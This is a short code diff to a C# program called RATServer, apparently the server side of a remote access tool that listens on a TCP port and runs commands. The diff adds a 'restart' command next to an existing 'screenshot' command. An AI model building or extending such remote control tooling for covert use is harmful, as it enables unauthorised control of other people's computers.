@@ -15,6 +15,7 @@ namespace RATServer
         static TcpListener tcpc = new TcpListener(port);
         #endregion
         #region "Main"
+        [STAThread]
         static void Main(string[] args)
         {
             Console.WriteLine("Server Running...");
@@ -98,6 +99,9 @@ namespace RATServer
                             break;
                         case "screenshot":
                             r = Functions.ScreenShot();
+                            break;
+                        case "restart":
+                            r = Functions.Restart();
                             break;
                         default:
                             break;
